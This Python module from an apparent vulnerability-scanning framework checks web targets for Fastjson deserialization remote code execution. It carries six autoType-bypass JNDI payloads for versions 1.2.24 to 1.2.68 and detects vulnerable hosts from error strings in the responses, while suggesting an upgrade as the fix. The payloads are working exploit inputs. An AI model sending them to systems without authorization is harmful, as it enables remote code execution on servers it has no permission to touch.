import json
from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("fastjson_rce")


@register_scanner
class FastjsonRCEScanner(BaseScanner):
    name = "Fastjson 反序列化RCE"
    description = "Fastjson反序列化漏洞，支持1.2.24~1.2.80多版本利用"
    category = "fastjson"
    module = "fastjson_rce"
    risk_level = "critical"
    risk_score = 9
    cve_ids = ["CVE-2017-18349", "CVE-2019-16747", "CVE-2022-25845"]
    references = [
        "https://nvd.nist.gov/vuln/detail/CVE-2017-18349",
        "https://github.com/alibaba/fastjson/wiki/security_update",
    ]
    fix_suggestion = "升级Fastjson至1.2.83+或迁移到Fastjson2，开启safeMode"

    PAYLOADS = [
        {
            "name": "Fastjson 1.2.24 JndiDataSourceFactory",
            "version": "1.2.24",
            "payload": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "rmi://127.0.0.1:1099/Exploit",
                "autoCommit": True,
            },
        },
        {
            "name": "Fastjson 1.2.41",
            "version": "1.2.41",
            "payload": {
                "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
                "dataSourceName": "rmi://127.0.0.1:1099/Exploit",
                "autoCommit": True,
            },
        },
        {
            "name": "Fastjson 1.2.42",
            "version": "1.2.42",
            "payload": {
                "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
                "dataSourceName": "rmi://127.0.0.1:1099/Exploit",
                "autoCommit": True,
            },
        },
        {
            "name": "Fastjson 1.2.43",
            "version": "1.2.43",
            "payload_raw": '{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://127.0.0.1:1099/Exploit","autoCommit":true}]}',
            "payload": {
                "@type": "java.lang.AutoCloseable",
                "dataSourceName": "rmi://127.0.0.1:1099/Exploit",
                "autoCommit": True,
            },
        },
        {
            "name": "Fastjson 1.2.47 (缓存绕过)",
            "version": "1.2.47",
            "payload": {
                "a": {
                    "@type": "java.lang.Class",
                    "val": "com.sun.rowset.JdbcRowSetImpl",
                },
                "b": {
                    "@type": "com.sun.rowset.JdbcRowSetImpl",
                    "dataSourceName": "rmi://127.0.0.1:1099/Exploit",
                    "autoCommit": True,
                },
            },
        },
        {
            "name": "Fastjson 1.2.68 AutoType bypass",
            "version": "1.2.68",
            "payload_raw": '{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Exploit","autoCommit":true}',
            "payload": {
                "@type": "java.lang.AutoCloseable",
                "dataSourceName": "rmi://127.0.0.1:1099/Exploit",
                "autoCommit": True,
            },
        },
    ]

    def check(self) -> bool:
        found = False
        api_paths = ["/api", "/api/v1", "/api/data", "/json", "/data", "/action"]

        is_json_api = False
        for path in api_paths:
            url = f"{self.target}{path}"
            resp = http_request("GET", url)
            if resp and "application/json" in resp.headers.get("content-type", ""):
                is_json_api = True
                break
            if resp and resp.status_code in [200, 400, 405]:
                is_json_api = True
                break

        if not is_json_api:
            for path in ["/", "/api"]:
                url = f"{self.target}{path}"
                resp = http_request("POST", url, data="{}", headers={"Content-Type": "application/json"})
                if resp and resp.status_code not in [404, 405]:
                    is_json_api = True
                    break

        if not is_json_api:
            return False

        for payload_info in self.PAYLOADS:
            send_variants = [
                {"data": payload_info["payload"], "raw": json.dumps(payload_info["payload"])},
            ]
            if "payload_raw" in payload_info:
                send_variants.append({"data": payload_info["payload_raw"], "raw": payload_info["payload_raw"]})

            for variant in send_variants:
                for path in api_paths:
                    url = f"{self.target}{path}"
                    if isinstance(variant["data"], str):
                        resp = http_request("POST", url, data=variant["data"],
                                            headers={"Content-Type": "application/json"})
                    else:
                        resp = http_request("POST", url, json_data=variant["data"],
                                            headers={"Content-Type": "application/json"})
                    if resp is None:
                        continue

                    error_indicators = [
                        "autoType is not support", "fastjson",
                        "com.sun.rowset", "JdbcRowSetImpl",
                        "dataSourceName", "rmi://",
                        "java.lang.Class", "deserializ",
                    ]
                    for indicator in error_indicators:
                        if indicator.lower() in resp.text.lower():
                            self.add_result(
                                name=payload_info["name"],
                                target_url=url,
                                detail=f"Fastjson {payload_info['version']} 反序列化触发",
                                payload=variant["raw"],
                                request_data=f"POST {url}",
                                response_snippet=resp.text[:500],
                                evidence=f"响应包含特征: {indicator}",
                            )
                            found = True
                            break
                    if found:
                        break
                if found:
                    break
            if found:
                break

        return found
